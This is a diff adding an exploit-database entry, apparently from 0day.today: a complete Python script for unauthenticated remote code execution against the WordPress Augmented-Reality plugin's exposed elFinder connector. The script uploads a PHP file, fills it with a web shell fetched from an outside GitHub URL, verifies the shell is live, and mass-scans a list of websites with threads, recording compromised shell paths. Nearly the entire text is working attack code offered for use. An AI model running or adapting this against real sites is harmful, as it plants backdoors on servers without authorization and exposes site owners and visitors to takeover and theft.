@@ -1,0 +1,100 @@
+id: 39316
+date: 02/11/2024
+title: Wordpress Augmented-Reality - Remote Code Execution Unauthenticated Exploit
+author: Milad karimi
+cves: 
+
+# Exploit Title: Wordpress Augmented-Reality - Remote Code Execution Unauthenticated
+# Date: 2023-09-20
+# Author: Milad Karimi (Ex3ptionaL)
+# Category : webapps
+# Tested on: windows 10 , firefox
+
+import requests as req
+import json
+import sys
+import random
+import uuid
+import urllib.parse
+import urllib3
+from multiprocessing.dummy import Pool as ThreadPool
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+filename="{}.php".format(str(uuid.uuid4())[:8])
+proxies = {}
+#proxies = {
+#  'http': 'http://127.0.0.1:8080',
+#  'https': 'http://127.0.0.1:8080',
+#}
+phash = "l1_Lw"
+r=req.Session()
+user_agent={
+"User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36"
+}
+r.headers.update(user_agent)
+def is_json(myjson):
+  try:
+    json_object = json.loads(myjson)
+  except ValueError as e:
+    return False
+  return True
+def mkfile(target):
+    data={"cmd" : "mkfile", "target":phash, "name":filename}
+    resp=r.post(target, data=data)
+    respon = resp.text
+    if resp.status_code == 200 and is_json(respon):
+        resp_json=respon.replace(r"\/", "").replace("\\", "")
+        resp_json=json.loads(resp_json)
+        return resp_json["added"][0]["hash"]
+    else:
+        return False
+def put(target, hash):
+    content=req.get("https://raw.githubusercontent.com/0x5a455553/MARIJUANA/master/MARIJUANA.php", proxies=proxies, verify=False)
+    content=content.text
+    data={"cmd" : "put", "target":hash, "content": content}
+    respon=r.post(target, data=data, proxies=proxies, verify=False)
+    if respon.status_code == 200:
+      return True
+def exploit(target):
+    try:
+        vuln_path = "{}/wp-content/plugins/augmented-reality/vendor/elfinder/php/connector.minimal.php".format(target)
+        respon=r.get(vuln_path, proxies=proxies, verify=False).status_code
+        if respon != 200:
+          print("[FAIL] {}".format(target))
+          return
+        hash=mkfile(vuln_path)
+        if hash == False:
+          print("[FAIL] {}".format(target))
+          return
+        if put(vuln_path, hash):
+          shell_path = "{}/wp-content/plugins/augmented-reality/file_manager/{}".format(target,filename)
+          status = r.get(shell_path, proxies=proxies, verify=False).status_code
+          if status==200 :
+              with open("result.txt", "a") as newline:
+                  newline.write("{}\n".format(shell_path))
+                  newline.close()
+              print("[OK] {}".format(shell_path))
+              return
+          else:
+              print("[FAIL] {}".format(target))
+              return
+        else:
+          print("[FAIL] {}".format(target))
+          return
+    except req.exceptions.SSLError:
+          print("[FAIL] {}".format(target))
+          return
+    except req.exceptions.ConnectionError:
+          print("[FAIL] {}".format(target))
+          return
+def main():
+    threads = input("[?] Threads > ")
+    list_file = input("[?] List websites file > ")
+    print("[!] all result saved in result.txt")
+    with open(list_file, "r") as file:
+        lines = [line.rstrip() for line in file]
+        th = ThreadPool(int(threads))
+        th.map(exploit, lines)
+if __name__ == "__main__":
+    main()
+
+#  0day.today [2024-02-12]  #
